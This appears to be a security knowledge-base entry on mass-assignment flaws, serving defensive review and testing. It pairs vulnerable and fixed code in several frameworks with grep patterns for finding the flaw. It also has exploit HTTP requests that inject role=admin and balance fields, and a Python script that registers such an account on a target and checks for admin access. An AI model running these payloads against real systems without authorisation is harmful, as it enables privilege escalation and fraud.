# Mass Assignment

**Tags:** #high #mass-assignment #orm #privilege-escalation #api
**OWASP:** A03:2021 Injection / A01:2021 Broken Access Control
**CVSS Base:** 8.8 (High) 9.8 (Critical if allows role=admin)

---

## 📖 What it is

Frameworks with automatic ORM assign input fields directly to the object/model without filtering. If the developer does not use protections such as `$fillable`/`$guarded` (Laravel), `attr_accessible` (Rails), the attacker can set protected fields like `role`, `is_admin`, `balance`, `verified`.

---

## 🔍 `grep_search` Tactics

```
fill(
update(request
mass_assignment
@ModelAttribute
bind(req.body
new User(req.body)
User.create(req.body)
User.update(req.body)
Object.assign(user, req.body)
Object.assign(model, body)
$model->fill(
params.require(
permit(
```

---

## 🎯 Vulnerable Frameworks by Framework

### Laravel / Eloquent (PHP)

```php
//  VULNERABLE  fill() without $fillable
class User extends Model {
    // Without protected $fillable = [...]  All fields assignable!
}

$user = new User();
$user->fill($request->all());  // attacker sends role=admin
$user->save();
```

```php
//  CORRECT
class User extends Model {
    protected $fillable = ['name', 'email', 'password'];
    protected $guarded = ['role', 'is_admin', 'verified'];
}
```

---

### Express / Node.js

```javascript
//  VULNERABLE  Object.assign with full req.body
app.post('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    Object.assign(user, req.body);  // req.body may contain {role: "admin"}
    await user.save();
});

//  CORRECT  explicit whitelist of allowed fields
app.post('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    const { name, email, bio } = req.body;  // Only allowed fields
    Object.assign(user, { name, email, bio });
    await user.save();
});
```

---

### Spring MVC / Java (via `@ModelAttribute`)

```java
//  VULNERABLE  @ModelAttribute automatic binding
@PostMapping("/update")
public String update(@ModelAttribute User user) {
    userService.save(user);  // all form fields mapped to User
    return "success";
}
```

```java
//  CORRECT  use explicit DTO
@PostMapping("/update")
public String update(@ModelAttribute UserUpdateDTO dto) {
    // UserUpdateDTO only has {name, email}
    // role, isAdmin do not exist in the DTO
    userService.updateFromDto(dto);
    return "success";
}
```

---

### Ruby on Rails

```ruby
#  VULNERABLE  Rails 3 (before strong parameters)
def update
  @user = User.find(params[:id])
  @user.update_attributes(params[:user])  # any attribute!
end

#  CORRECT  Strong Parameters (Rails 4+)
def update
  @user = User.find(params[:id])
  @user.update(user_params)
end

private

def user_params
  params.require(:user).permit(:name, :email)  # explicit whitelist
end
```

---

## 💣 Privilege Escalation Exploit

```bash
# Normal registration
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "email": "attacker@evil.com",
    "password": "hunter2",
    "name": "Hacker"
}

# Exploit  add protected fields
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "email": "attacker@evil.com",
    "password": "hunter2",
    "name": "Hacker",
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "plan": "premium",
    "balance": 99999
}
```

---

## 🧪 Test Script

```python
# .tmp/validate_mass_assignment.py
import requests

TARGET = "http://target.com"

# Extra fields to try
EXTRA_FIELDS = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "verified": True,
    "plan": "premium",
    "balance": 999999,
    "credit": 999999,
    "subscription": "enterprise",
}

# Legitimate base registration
base_payload = {
    "email": f"test_mass_assign@evil.com",
    "password": "Test1234!",
    "name": "Test User",
}

# Add extra fields to payload
test_payload = {**base_payload, **EXTRA_FIELDS}

# Register
r = requests.post(f"{TARGET}/api/register", json=test_payload, timeout=10)
print(f"Register: {r.status_code}")
print(f"Response: {r.text[:300]}")

# Try to log in and check role
if r.status_code in [200, 201]:
    login_r = requests.post(f"{TARGET}/api/login", json={
        "email": base_payload["email"],
        "password": base_payload["password"]
    }, timeout=10)
    print(f"\nLogin: {login_r.status_code}")
    print(f"Token/Session: {login_r.text[:300]}")
    
    # Check if the role was accepted
    token = login_r.json().get('token', '')
    if token:
        profile_r = requests.get(f"{TARGET}/api/profile", 
                                  headers={"Authorization": f"Bearer {token}"})
        print(f"\nProfile: {profile_r.text[:300]}")
        if "admin" in profile_r.text.lower():
            print("\n[CRITICAL VULN] Mass Assignment confirmed  role=admin accepted!")
```

---

## 🛡️ Fix  General Principle

**Explicit whitelist** always. Never rely on the blacklist model.

```python
#  Django  exclude sensitive fields from Form
class UserUpdateForm(forms.ModelForm):
    class Meta:
        model = User
        fields = ['first_name', 'last_name', 'email']
        # 'role', 'is_staff', 'is_superuser' are not in the whitelist
```

```python
#  Flask-SQLAlchemy  never update with full dict
@app.put('/users/<int:user_id>')
@login_required
def update_user(user_id):
    data = request.json
    user = User.query.get_or_404(user_id)
    
    # Explicitly extract only allowed fields
    allowed_fields = {'name', 'email', 'bio', 'avatar_url'}
    for field in allowed_fields:
        if field in data:
            setattr(user, field, data[field])
    
    # NEVER: for field, value in data.items(): setattr(user, field, value)
    
    db.session.commit()
```

---

## 🔗 Chain Exploits

```
Mass Assignment + role=admin  Full admin access without privilege
Mass Assignment + verified=true  Email verification bypass
Mass Assignment + balance=9999  Immediate financial fraud
Mass Assignment + is_staff=true (Django)  Access to Django Admin
Mass Assignment + plan=enterprise  Free access to paid features
```

---

## 📌 References
- [[business-logic-flaws]]
- [[idor-bola-broken-object-level-authorization]]
- [[authentication-session-management]]
- [OWASP Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)